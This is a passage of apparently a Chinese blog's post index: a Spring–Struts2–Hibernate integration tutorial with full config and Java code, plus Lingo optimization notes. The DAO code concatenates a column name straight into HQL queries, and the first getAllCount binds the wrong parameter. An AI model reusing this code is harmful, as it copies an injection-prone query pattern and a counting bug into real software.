propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"login*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"get*\" propagation=\"REQUIRED\" read-only=\"true\"/&gt; &lt;tx:method name=\"load*\" propagation=\"REQUIRED\" read-only=\"true\"/&gt; &lt;tx:method name=\"list*\" propagation=\"REQUIRED\" read-only=\"true\"/&gt; &lt;tx:method name=\"*\" propagation=\"REQUIRED\" read-only=\"true\"/&gt; &lt;/tx:attributes&gt; &lt;/tx:advice&gt; 定义事务的切入点 12345&lt;!-- 定义事务的切入点 --&gt; &lt;aop:config expose-proxy=\"true\"&gt; &lt;aop:pointcut expression=\"execution(* com.tianxingjian..service.*.*(..))\" id=\"pointcut\"/&gt; &lt;aop:advisor advice-ref=\"txAdvice\" pointcut-ref=\"pointcut\"/&gt; &lt;/aop:config&gt; _以上就是本次项目中applicationContext.xml文件的相关配置，完整的applicationContext.xml文件的代码如下：_ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:p=\"http://www.springframework.org/schema/p\" xmlns:tx=\"http://www.springframework.org/schema/tx\" xmlns:context=\"http://www.springframework.org/schema/context\" xmlns:aop=\"http://www.springframework.org/schema/aop\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.1.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.1.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-4.1.xsd http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx.xsd\"&gt; &lt;!-- 配置annotation的支持操作 --&gt; &lt;context:annotation-config/&gt; &lt;context:component-scan base-package=\"com.tianxingjian\"/&gt; &lt;!-- 在本程序中设置要导入的资源文件路径，直接通过classpath加载 --&gt; &lt;context:property-placeholder location=\"classpath:database.properties\"/&gt; &lt;!-- 配合数据库连接池 --&gt; &lt;bean id=\"dataSource\" class=\"com.mchange.v2.c3p0.ComboPooledDataSource\"&gt; &lt;property name=\"driverClass\" value=\"$&#123;db.driver&#125;\"/&gt; &lt;property name=\"jdbcUrl\" value=\"$&#123;db.url&#125;\"/&gt; &lt;property name=\"user\" value=\"$&#123;db.user&#125;\"/&gt; &lt;property name=\"password\" value=\"$&#123;db.password&#125;\"/&gt; &lt;property name=\"maxPoolSize\" value=\"$&#123;pool.max&#125;\"/&gt; &lt;property name=\"minPoolSize\" value=\"$&#123;pool.min&#125;\"/&gt; &lt;property name=\"initialPoolSize\" value=\"$&#123;pool.init&#125;\"/&gt; &lt;property name=\"maxIdleTime\" value=\"$&#123;pool.idle&#125;\"/&gt; &lt;/bean&gt; &lt;!-- 配置Hibernate的相关环境，SessionFactory可以打开Session --&gt; &lt;bean id=\"sessionFactory\" class=\"org.springframework.orm.hibernate4.LocalSessionFactoryBean\"&gt; &lt;property name=\"configLocation\" value=\"classpath:hibernate.cfg.xml\"&gt; &lt;/property&gt; &lt;!-- 就表示这个项目里面引用数据源关系 --&gt; &lt;property name=\"dataSource\" ref=\"dataSource\"/&gt; &lt;/bean&gt; &lt;!-- 配置事务处理，所有的事务都采用AOP的方式，本处只声明SessionFactory要进行事务处控制--&gt; &lt;bean id=\"transactionManager\" class=\"org.springframework.orm.hibernate4.HibernateTransactionManager\"&gt; &lt;property name=\"sessionFactory\" ref=\"sessionFactory\" /&gt; &lt;/bean&gt; &lt;!-- 事务的配置声明 --&gt; &lt;tx:annotation-driven transaction-manager=\"transactionManager\" /&gt; &lt;tx:advice id=\"txAdvice\" transaction-manager=\"transactionManager\"&gt; &lt;!-- 定义一切与服务层有关的方法名称，只要是使用了特定的名称那么就会自动进行处理事务 --&gt; &lt;tx:attributes&gt; &lt;tx:method name=\"insert*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"update*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"delete*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"add*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"edit*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"change*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"login*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"get*\" propagation=\"REQUIRED\" read-only=\"true\"/&gt; &lt;tx:method name=\"load*\" propagation=\"REQUIRED\" read-only=\"true\"/&gt; &lt;tx:method name=\"list*\" propagation=\"REQUIRED\" read-only=\"true\"/&gt; &lt;tx:method name=\"*\" propagation=\"REQUIRED\" read-only=\"true\"/&gt; &lt;/tx:attributes&gt; &lt;/tx:advice&gt; &lt;!-- 定义事务的切入点 --&gt; &lt;aop:config expose-proxy=\"true\"&gt; &lt;aop:pointcut expression=\"execution(* com.tianxingjian..service.*.*(..))\" id=\"pointcut\"/&gt; &lt;aop:advisor advice-ref=\"txAdvice\" pointcut-ref=\"pointcut\"/&gt; &lt;/aop:config&gt;&lt;/beans&gt; 2. 编写src代码用于本次测试2.1 生成News.java的POJO类我们利用Annotation的注解方式完成： windows -&gt; perspetive -&gt; open perspective -&gt; database explore -&gt; 右键mysql -&gt; 连接 找到要处理的表 -&gt; 右键Hibernate reverse -&gt; src为项目的src路径，java package一般为com.tianxingjian.pojo -&gt; √create pojo -&gt; 点击add Hibernate mapping annotations to pojo -&gt; next -&gt; id generator -&gt; native -&gt; next -&gt; 点击表然后native -&gt; finish，生成pojo的时候最好把create abstract class取消掉，生成之后为了便于之后的JUnit测试加上toString方法，完整的News.java代码如下：上述操作完成之后pojo类的映射操作将自动保存在hibernate.cfg.xml文件中，代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889package com.tianxingjian.pojo;import java.util.Date;import javax.persistence.Column;import javax.persistence.Entity;import javax.persistence.GeneratedValue;import javax.persistence.Id;import javax.persistence.Table;import javax.persistence.Temporal;import javax.persistence.TemporalType;/** * News entity. @author MyEclipse Persistence Tools */@Entity@Table(name = \"news\", catalog = \"news_db\")public class News implements java.io.Serializable &#123; // Fields private Integer nid; private String title; private Date date; private String content; // Constructors /** default constructor */ public News() &#123; &#125; /** full constructor */ public News(String title, Date date, String content) &#123; this.title = title; this.date = date; this.content = content; &#125; // Property accessors @Id @GeneratedValue @Column(name = \"nid\", unique = true, nullable = false) public Integer getNid() &#123; return this.nid; &#125; public void setNid(Integer nid) &#123; this.nid = nid; &#125; @Column(name = \"title\", length = 100) public String getTitle() &#123; return this.title; &#125; public void setTitle(String title) &#123; this.title = title; &#125; @Temporal(TemporalType.DATE) @Column(name = \"date\", length = 10) public Date getDate() &#123; return this.date; &#125; public void setDate(Date date) &#123; this.date = date; &#125; @Column(name = \"content\", length = 100) public String getContent() &#123; return this.content; &#125; public void setContent(String content) &#123; this.content = content; &#125; @Override public String toString() &#123; return \"News [nid=\" + nid + \", title=\" + title + \", date=\" + date + \", content=\" + content + \"]\\n\"; &#125;&#125; 1&lt;mapping class=\"com.tianxingjian.pojo.News\" /&gt; 2.2 定义INewsDAO.java接口123456789101112131415package com.tianxingjian.dao;import java.util.List;import java.util.Set;import com.tianxingjian.pojo.News;public interface INewsDAO &#123; public boolean doCreate(News vo) throws Exception; public boolean doUpdate(News vo) throws Exception; public News getElementById(Integer id) throws Exception; public boolean doRemoveBatch(Set&lt;Integer&gt; ids) throws Exception; public List&lt;News&gt; findAll() throws Exception; public List&lt;News&gt; findAllSplit(String column, String keyWord, Integer currentPage, Integer lineSize) throws Exception; public Integer getAllCount(String column, String keyWord) throws Exception;&#125; 2.2 实现NewsDAOImpl.java类12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879package com.tianxingjian.dao.impl;import java.util.Iterator;import java.util.List;import java.util.Set;import javax.annotation.Resource;import org.hibernate.Criteria;import org.hibernate.Query;import org.hibernate.SessionFactory;import org.springframework.stereotype.Component;import com.tianxingjian.dao.INewsDAO;import com.tianxingjian.pojo.News;@Componentpublic class NewsDAOImpl implements INewsDAO &#123; @Resource private SessionFactory sessionFactory; @Override public boolean doCreate(News vo) throws Exception &#123; return sessionFactory.getCurrentSession().save(vo) != null; &#125; @Override public boolean doUpdate(News vo) throws Exception &#123; String hql = \"update News set title=?, date=?, content=? where nid=?\"; Query query = this.sessionFactory.getCurrentSession().createQuery(hql); query.setParameter(0, vo.getTitle()); query.setParameter(1, vo.getDate()); query.setParameter(2, vo.getContent()); query.setParameter(3, vo.getNid()); return query.executeUpdate() &gt; 0; &#125; @Override public News getElementById(Integer id) throws Exception &#123; return (News) this.sessionFactory.getCurrentSession().get(News.class, id); &#125; @Override public boolean doRemoveBatch(Set&lt;Integer&gt; ids) throws Exception &#123; StringBuffer buffer = new StringBuffer(); buffer.append(\"delete from News where nid in (\"); Iterator&lt;Integer&gt; iterator = ids.iterator(); while (iterator.hasNext()) &#123; buffer.append(iterator.next()).append(\",\"); &#125; buffer.delete(buffer.length()-1, buffer.length()).append(\")\"); Query query = this.sessionFactory.getCurrentSession().createQuery(buffer.toString()); return query.executeUpdate() &gt; 0; &#125; @SuppressWarnings(\"unchecked\") @Override public List&lt;News&gt; findAll() throws Exception &#123; Criteria criteria = this.sessionFactory.getCurrentSession().createCriteria(News.class); return criteria.list(); &#125; @SuppressWarnings(\"unchecked\") @Override public List&lt;News&gt; findAllSplit(String column, String keyWord, Integer currentPage, Integer lineSize) throws Exception &#123; String hql = \"from News as n where n.\" + column + \" like ?\"; Query query = this.sessionFactory.getCurrentSession().createQuery(hql); query.setParameter(0, \"%\" + keyWord + \"%\"); query.setFirstResult((currentPage-1)*lineSize); query.setMaxResults(lineSize); return query.list(); &#125; @Override public Integer getAllCount(String column, String keyWord) throws Exception &#123; String hql = \"select count(*) from News as n where n.\" + column + \" like ?\"; Query query = this.sessionFactory.getCurrentSession().createQuery(hql); query.setParameter(0, \"%\" + column + \"%\"); Long count = (Long) query.uniqueResult(); return count.intValue(); &#125;&#125; 2.3 定义业务层INewsService.java接口12345678910111213141516package com.tianxingjian.service;import java.util.List;import java.util.Map;import java.util.Set;import com.tianxingjian.pojo.News;public interface INewsService &#123; public boolean insert(News vo) throws Exception; public boolean update(News vo) throws Exception; public News get(Integer id) throws Exception; public boolean delete(Set&lt;Integer&gt; ids) throws Exception; public List&lt;News&gt; list() throws Exception; public Map&lt;String, Object&gt; list(String column, String keyWord, Integer currentPage, Integer lineSize) throws Exception;&#125; 2.4 编写测试程序，用JUnit 点击IServiceImpl 点击MyEclipse右上角的New图标 查询Junit Test Case 将package改为com.tianxingjian.test -&gt; next 全选 -&gt; finish 使用JUnit进行单个方法的测试： 选中需要测试的类 把类进行展开 把C进行展开 就可以看到测试类中所有的方法 点击所需要运行的测试方法然后右键junit运行就行了 _注意: 在写hql语句的时候表名应该大写表示对象而不是小写，如下所示_ 12String hql = \"update News set title=?,date=?,content=? where nid=?\"; // 正确String hql = \"update news set title=?,date=?,content=? where nid=?\"; // 错误 完整JUnit测试代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798package com.tianxingjian.test;import static org.junit.Assert.*;import java.util.Date;import java.util.HashSet;import java.util.Set;import org.junit.Test;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;import org.springframework.stereotype.Service;import com.tianxingjian.pojo.News;import com.tianxingjian.service.INewsService;import junit.framework.TestCase;public class INewsServiceTest &#123; public static ApplicationContext ctx; static &#123; ctx = new ClassPathXmlApplicationContext(\"applicationContext.xml\"); &#125; @Test public void testInsert() &#123; INewsService service = ctx.getBean(\"newsServiceImpl\", INewsService.class); News vo = new News(); vo.setTitle(\"SSH整合了-\" + System.currentTimeMillis()); vo.setDate(new Date()); vo.setContent(\"SSH内容很丰富！\"); try &#123; TestCase.assertEquals(service.insert(vo), true); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; @Test public void testUpdate() &#123; INewsService service = ctx.getBean(\"newsServiceImpl\", INewsService.class); News vo = new News(); vo.setNid(5); vo.setTitle(\"准备开始学习了！\"); vo.setDate(new Date()); vo.setContent(\"你高兴么！\"); try &#123; TestCase.assertEquals(service.update(vo), true); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; @Test public void testGet() &#123; INewsService service = ctx.getBean(\"newsServiceImpl\", INewsService.class); try &#123; System.out.println(service.get(1)); &#125; catch (Exception e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; &#125; @Test public void testDelete() &#123; INewsService service = ctx.getBean(\"newsServiceImpl\", INewsService.class); Set&lt;Integer&gt; set = new HashSet&lt;Integer&gt;(); set.add(5); set.add(4); try &#123; TestCase.assertEquals(service.delete(set), true); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; @Test public void testList() &#123; INewsService service = ctx.getBean(\"newsServiceImpl\", INewsService.class); try &#123; System.out.println(service.list()); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; @Test public void testListStringStringIntegerInteger() &#123; INewsService service = ctx.getBean(\"newsServiceImpl\", INewsService.class); try &#123; System.out.println(service.list(\"title\", \"\", 1, 3)); &#125; catch (Exception e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; &#125;&#125; 3.将Spring和Struts2.x进行整合3.1 添加Struts2.x的支持 install Struts2.x facet -&gt; next -&gt; next -&gt; √ Spring Plugin -&gt; finish 3.2 为Spring添加监听器，即可在web中使用 监听器名称：org.springframework.web.context.ContextLoderListen 3.2.1 在web.xml文件中添加监听器（MyEclipse会自动添加）123&lt;listener&gt; &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt; &lt;/listener&gt; 3.2.2 在web.xml文件中将applicationContext.xml里的配置设置到Web环境之中,将路径的信息设置为applicationContext.xml属性范围（MyEclipse会自动进行配置）1234&lt;context-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;classpath:applicationContext.xml&lt;/param-value&gt; &lt;/context-param&gt; 3.3 进行Struts的相关配置3.3.1 建立struts.properties文件，这个文件是用于设置对象工厂123struts.i18n.encoding=UTF-8struts.custom.i118n.resource=Messages,Pagesstruts.objectFactory=spring 3.1.2 修改struts.xml文件本次只是将SSH进行整合，所以只是简单的配置了name、namespace和extends，在实际开发中，需要在package里进行相关跳转路径的配置 123&lt;package name=\"root\" namespace=\"/\" extends=\"struts-default\"&gt; &lt;/package&gt; 3.1.3 编写NewsAction.java程序，用于进行相关的业务操作NewsAction.java的完整代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687package com.tianxingjian.action;import java.util.HashSet;import java.util.Set;import javax.annotation.Resource;import org.apache.struts2.ServletActionContext;import org.apache.struts2.convention.annotation.Action;import org.apache.struts2.convention.annotation.Namespace;import org.apache.struts2.convention.annotation.ParentPackage;import org.springframework.stereotype.Repository;import com.opensymphony.xwork2.ActionSupport;import com.tianxingjian.pojo.News;import com.tianxingjian.service.INewsService;@Repository@ParentPackage(\"root\")@Namespace(\"/pages/news\")@Action(value=\"NewsAction\")@SuppressWarnings(\"serial\")public class NewsAction extends ActionSupport&#123; @Resource private INewsService newsService; private News news = new News(); public News getNews() &#123; return news; &#125; public void insert() &#123; System.out.println(\"【新闻数据增加】数据\" + this.news); try &#123; System.out.println(\"【新闻数据增加】业务调用结果\" + this.newsService.insert(this.news)); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; public void update() &#123; System.out.println(\"【新闻数据修改】数据\" + this.news); try &#123; System.out.println(\"【新闻数据修改】业务调用结果\" + this.newsService.update(this.news)); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; public void delete() &#123; String ids = ServletActionContext.getRequest().getParameter(\"ids\"); System.out.println(\"【新闻数据删除】数据\" + ids); try &#123; Set&lt;Integer&gt; set = new HashSet&lt;Integer&gt;(); String result [] = ids.split(\"_\"); for (int x=0; x&lt;result.length; x++) &#123; set.add(Integer.parseInt(result[x])); &#125; System.out.println(\"【新闻数据删除】业务调用结果\" + this.newsService.delete(set)); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; public void get() &#123; System.out.println(\"【新闻数据取得】数据\" + this.news); try &#123; System.out.println(\"【新闻数据取得】业务调用结果：\" + this.newsService.get(this.news.getNid())); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; public void list() &#123; System.out.println(\"【新闻数据查询】数据\" + this.news); try &#123; System.out.println(\"【新闻数据查询】业务调用结果：\" + this.newsService.list()); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; public void listSplit() &#123; System.out.println(\"【新闻数据查询】数据\" + this.news); try &#123; System.out.println(\"【新闻数据查询】业务调用结果：\" + this.newsService.list(\"title\", \"\", 1, 3)); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 3.1.4 启动Tomcat并进行测试（测试时在地址上进行传参） 启动Tomcat 访问地址： 添加地址：http://localhost:8080/SSHDemo/pages/news/NewsAction!insert.action?news.title=&quot;今天好心情！&quot;&amp;news.content=&quot;是的呢！今天好心情啊！！！“ 更新地址：http://localhost:8080/SSHDemo/pages/news/NewsAction!update.action?news.nid=5&amp;news.title=&quot;今天好心情！&quot;&amp;news.content=&quot;是的呢！今天好心情啊！！！“ 删除地址：http://localhost:8080/SSHDemo/pages/news/NewsAction!delete.action?ids=&quot;6_7“ 查询全部：http://localhost:8080/SSHDemo/pages/news/NewsAction!list.action 分页查询：http://localhost:8080/SSHDemo/pages/news/NewsAction!listSplit.action 根据id查询：http://localhost:8080/SSHDemo/pages/news/NewsAction!get.action?news.nid=6 _在运行的时候有可能会出现以下几个错误：_ java.lang.NoSuchMethodError:antlr.collections.AST.getLine()_**解决方案：这个错误的产生原因是Hibernate和Struts中都存在antrl的文件，只需要将低版本的jar文件进行移除就可以了。操作：window -&gt; preference -&gt; lib -&gt; struts2.1 -&gt; core -&gt; 取消antrl的jar文件 -&gt; apply -&gt; 出来后重新刷新如果依然有错就将strutss2进行remove build path然后重新添加 Caused by: java.lang.ClassNotFoundException: com.mchange.v2.ser.Indirector解决方案：在官网下载一个mchange-commons-java的jar文件，然后build path并添加到lib中，这样就能配置到项目中了，错误也就消失了，想这种错误都是缺少jar包，只需要下载并配置即可解决 4. HibernateDaoSupport支持类 以上实现的SSH整合是在Spring3.x被迫形成的，因为从最早的Spring2和现在的Spring4都会提供一个HibernateDaoSupport类，利用这个类结合HibernateTemplate操作模板就可以轻松地实现，HibernateDaoSupport类里面提供的一系列的操作方法还可以简化Hibernate的编写难度。 在org.springframework.orm.hibernate4.support.HibernateDaoSupport里提供有如下方法： |- 构造方法：public HibernateDaoSupport(); |- 设置Hibernate操作模板：public final void setHibernateTemplate(HibernateTemplate hibernateTemplate); |- 取得Hibernate操作模板：public final HibernateTemplate getHibernateTemplate(); 如果要想使用这个操作则需要清楚HibernateTemplate的定义，有如下一些方法： |- 构造方法：public HibernateTemplate(); |- 设置SessionFactory：public void setSessionFactory(SessionFactory sessionFactory); 同时在HibernateTemplate中提供有一些列的简化Hibernate操作的方法。 4.1 利用HibernateDaoSupport实现操作4.1.1 修改applicationContext.xml文件123&lt;bean id=\"hibernateTemplate\" class=\"org.springframework.orm.hibernate4.HibernateTemplate\"&gt; &lt;property name=\"sessionFactory\" ref=\"sessionFactory\"/&gt;&lt;/bean&gt; 4.1.2 定义NewsDaoImpl子类的时候使用这个操作 extends HibernateDaoSupport 不再使用SessionFactory，而是使用HibernateTemplate 1234567@Autowired public NewsDAOImpl(HibernateTemplate ht) &#123; super.setHibernateTemplate(ht); &#125; // @Resource// private SessionFactory sessionFactory; 然后将处理方法中的this.sessionFactory改为super.getHibernateTemplate…… 更改后的NewsDaoImpl.java类如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596package com.tianxingjian.dao.impl;import java.util.Iterator;import java.util.List;import java.util.Set;import org.hibernate.Query;import org.hibernate.criterion.DetachedCriteria;import org.hibernate.criterion.Restrictions;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.orm.hibernate4.HibernateTemplate;import org.springframework.orm.hibernate4.support.HibernateDaoSupport;import org.springframework.stereotype.Component;import com.tianxingjian.dao.INewsDAO;import com.tianxingjian.pojo.News;@Componentpublic class NewsDAOImpl extends HibernateDaoSupport implements INewsDAO &#123; @Autowired public NewsDAOImpl(HibernateTemplate ht) &#123; super.setHibernateTemplate(ht); &#125; // @Resource// private SessionFactory sessionFactory; @Override public boolean doCreate(News vo) throws Exception &#123; return super.getHibernateTemplate().save(vo) != null;// return sessionFactory.getCurrentSession().save(vo) != null; &#125; @Override public boolean doUpdate(News vo) throws Exception &#123; String hql = \"update News set title=?, date=?, content=? where nid=?\";// Query query = super.getHibernateTemplate().createQuery(hql); Query query = super.getHibernateTemplate().getSessionFactory().getCurrentSession().createQuery(hql); query.setParameter(0, vo.getTitle()); query.setParameter(1, vo.getDate()); query.setParameter(2, vo.getContent()); query.setParameter(3, vo.getNid()); return query.executeUpdate() &gt; 0; &#125; @Override public News getElementById(Integer id) throws Exception &#123; return super.getHibernateTemplate().get(News.class, id);// return (News) this.sessionFactory.getCurrentSession().get(News.class, id); &#125; @Override public boolean doRemoveBatch(Set&lt;Integer&gt; ids) throws Exception &#123; StringBuffer buffer = new StringBuffer(); buffer.append(\"delete from News where nid in (\"); Iterator&lt;Integer&gt; iterator = ids.iterator(); while (iterator.hasNext()) &#123; buffer.append(iterator.next()).append(\",\"); &#125; buffer.delete(buffer.length()-1, buffer.length()).append(\")\"); Query query = super.getHibernateTemplate().getSessionFactory().getCurrentSession().createQuery(buffer.toString());// Query query = this.sessionFactory.getCurrentSession().createQuery(buffer.toString()); return query.executeUpdate() &gt; 0; &#125; @SuppressWarnings(\"unchecked\") @Override public List findAll() throws Exception &#123; DetachedCriteria dc = DetachedCriteria.forClass(News.class); return super.getHibernateTemplate().findByCriteria(dc);// Criteria criteria = this.sessionFactory.getCurrentSession().createCriteria(News.class);// return criteria.list(); &#125; @SuppressWarnings(\"unchecked\") @Override public List findAllSplit(String column, String keyWord, Integer currentPage, Integer lineSize) throws Exception &#123; DetachedCriteria dc = DetachedCriteria.forClass(News.class); dc.add(Restrictions.ilike(column, \"%\" + keyWord + \"%\")); return super.getHibernateTemplate().findByCriteria(dc, (currentPage-1)*lineSize, lineSize);// String hql = \"from News as n where n.\" + column + \" like ?\";// Query query = this.sessionFactory.getCurrentSession().createQuery(hql);// query.setParameter(0, \"%\" + keyWord + \"%\");// query.setFirstResult((currentPage-1)*lineSize);// query.setMaxResults(lineSize);// return query.list(); &#125; @Override public Integer getAllCount(String column, String keyWord) throws Exception &#123; String hql = \"select count(*) from News as n where n.\" + column + \" like ?\"; Long count = (Long) super.getHibernateTemplate().find(hql, \"%\" + keyWord + \"%\").get(0);// Query query = this.sessionFactory.getCurrentSession().createQuery(hql);// query.setParameter(0, \"%\" + column + \"%\");// Long count = (Long) query.uniqueResult(); return count.intValue(); &#125;&#125; 4.2 HibernateDaoSupport使用总结 使用HibernateDaoSupport的时候感觉似乎也并没有简单什么， 以上是两种操作方式，分别是使用SessionFactory和HibernateDaoSupport，这两个种基本都差不多，即在实际开发中这两种方法可根据自己的喜好来使用。 5. 使用MyEclipse进行SSH项目整合总结 以上便是此次利用MyEclipse进行SSH项目整合总结，感觉今天的学习效率很低，一天下来只是学了这个部分的内容，而且并不是说今天之后就被完全吸收，在之后的学习过程中还是需要不断的进行反反复复的温习。 学习时间：2018-07-17","path":"2018/09/20/利用MyEclipse进行SSH项目整合/"},{"title":"Lingo解决优化问题","text":"前言前面，我们已经对Lingo有了一定的了解，但是要想真正的熟悉Lingo在解决优化问题中的强大之处，还需要不断加强相关训练，本文主要是使用Lingo来解决优化问题，该文的主要目的有以下三点： 希望能够提升自己对Lingo的相关操作并加强对优化问题的思维模式 方便日后对Lingo核心操作的回顾 希望每一位到来的朋友能够有所收获 若您对Lingo的安装及基本操作不是很了解，可暂且移步：Lingo安装、Lingo基本操作 优化模型介绍优化模型主要有三个基本要素：决策变量、目标函数、约束条件。其一般形式如下： opt \\ \\ \\ \\ f(x) \\\\ s.t \\ \\ \\ \\ h_i(x)=0,\\ i=1,2,\\cdots,m \\\\ g_j(x)\\leq0,\\ j=1,2,\\cdots,l$opt$ 是“optimize”的缩写，表示“最优化”，一般为 $min$ 或 $max$，$f(x)$ 表示目标函数，$s.t.$ 是“subject to”的缩写“受约束于”，$h_i(x), g_i(x)$ 则表示约束条件，其中 $x$ 表示优化模型的决策变量。 运输问题问题描述 Question：有三个生产地和四个销售地，其生产量、销售量及单位运费如表所示，求总运费最少的运输方案以及总运费。 问题分析由题意，我们不难看出优化模型的决策变量是每个生产地向各个销售地运输的货量，即 $s_{ij}$。运输的总费用由各个产地向各个销售地运输所需费用之和，一个产地可以向多个销售地运输货物，一个销售地亦可接受多个产地的货物，所以可知优化模型中的目标函数是运输的总费用，即 $W=\\sum^3_{i=1}\\sum^4_{j=1}s_{ij}x_{ij}$。除此之外，该目标函数受到两个限制，即优化模型的约束条件： 生产地限制：每个生产地的运输量理应小于产生量，$\\sum_{j=1}^4s_{ij}\\leq a_i$ 销售地限制：每个销售地接受的货物理应等于销售量，$\\sum_{i=1}^3x_{ij}=b_j$ 优化模型构建有以上问题分析，为求出总运费最小的方案，我们可以构建该问题的优化模型如下： min \\ \\ \\ \\ \\sum^3_{i=1}\\sum^4_{j=1}s_{ij}x_{ij} \\\\ s.t. \\ \\ \\ \\ \\sum_{j=1}^4s_{ij}\\leq a_i \\;;\\ \\sum_{i=1}^3x_{ij}=b_j \\ ;\\ s_{ij}\\geq0 \\ ;模型求解求解的Lingo代码如下： 1234567891011121314151617sets:supply/1..3/: a;demand/1..4/: b;link(supply, demand): c, x;endsetsdata:a = 30,25,21;b = 15,17,22,12;c = 6,2,6,7, 4,9,5,3, 8,8,1,5;enddatamin = @sum(link(i,j): c(i,j) * x(i,j));@for(supply(i): @sum(demand(j): x(i,j)) &lt;= a(i));@for(demand(j): @sum(supply(i): x(i,j)) = b(j)); 求解结果运行如上所示Lingo程序，我们可以得到如下结果： 通过上图展示，我们可以得到运输的最佳方案以及最小运费161个单位。运输方案图示如下： 待续","path":"2018/09/14/Lingo解决优化问题/"},{"title":"Lingo基本操作","text":"前言Lingo是一门主要求解非线性规划数学模型的编程软件，记得最初接触Lingo是在阅读《数学建模教程》一书，该书在第五章主要讲解使用Lingo来解决优化问题，也是在那个时候认识到了Lingo的强大之处。Lingo的使用就好比解决一道简单的数学问题，而你只需要使用Lingo支持的编程规范给其提供充足的已知条件即可，之后会自动使用相关算法为您解答。为了日后更加方便的查询Lingo相关知识，所以将Lingo的基本使用在此记录。 关于Lingo的下载及安装问题鄙人已做整理，可参考本篇教程 Lingo安装 Lingo基本运算符算术运算符^：乘方*：乘/：除+：加-：减 逻辑运算符在Lingo中，逻辑运算符主要用于集循环函数的条件表达式中，来控制在函数中哪些集成员被包含，哪些被排斥。 符号 说明 #and# 且，&amp; #or# 或，\\ \\ #not# 非，! #eq# 等于，== #ne# 不等于，!= #gt# 大于，&gt; #ge# 大于等于，&gt;= #lt# 小于，&lt; #le# 小于等于，&lt;= 关系运算符= 、&lt;= 、 &gt;= 函数标准数学函数 函数 说明 @abs(x) 绝对值 @sin(x) 正弦值，采用弧度制 @cos(x) 余弦值 @tan(x) 正切 @exp(x) 指数，$e^x$ @log(x) 自然对数 @lgm(x) gamma函数的自然对数 @sign(x) x&lt;0返回-1，否则返回返回1 @floor(x) 取整 @smax($x_1,x_2,\\cdots,x_n$) 取($x_1,x_2,\\cdots,x_n$) 中的最大值 @smin($x_1,x_2,\\cdots,x_n$) 取($x_1,x_2,\\cdots,x_n$) 中的最小值 集循环函数集循环函数用于遍历整个集，其基本语法如下： 12@function(setname[(set_index_list)[|conditional_qualifier]]:expression_list); @function相应于下面罗列的四个集循环函数之一；setname是要遍历的集；set_ index_list是集索引列表；conditional_qualifier是用来限制集循环函数的范围，当集循环函数遍历集的每个成员时，LINGO都要对conditional_qualifier进行评价，若结果为真，则对该成员执行@function操作，否则跳过，继续执行下一次循环。expression_list是被应用到每个集成员的表达式列表，当用的是@for函数时，expression_list可以包含多个表达式，其间用逗号隔开。这些表达式将被作为约束加到模型中。当使用其余的三个集循环函数时，expression_list只能有一个表达式。如果省略set_index_list，那么在expression_list中引用的所有属性的类型都是setname集。 @for@for函数用来对集中的成员形成约束。 例：产生序列[1,4,9,16,25] 12345sets:nums/1..5/: x;endsets@for(nums(i): x(i)=i^2); @sum@sum函数返回遍历指定集成员的一个表达式的和 例：求[1,2,3,4,5,6,7]中前五个数的和 1234567sets:nums/1..7/: x;endsets@for(nums(i): x(i)=i);s = @sum(nums(i) | i #le# 5: x(i)); @max，@min这两个函数分别用于返回指定集成员的一个表达式的最大值和最小值 例：求[1,2,3,4,5,6,7,8,9,10]中前五个数的最大值，后五个数的最小值 12345678sets:nums/1..10/: x;endsets@for(nums(i): x(i)=i);min_value = @max(nums(i) | i #le# 5: x);max_value = @min(nums(i) | i #ge# 6: x); 变量界定函数该函数主要是对决策变量做附加限制，一般用于@for函数中，主要有如下四种： 函数 说明 @bin(x) 限制x为0或1 @bnd(a,x,b) 限制x取a到b之间的值 @free(x) x取实数 @gin(x) x取整数 说明 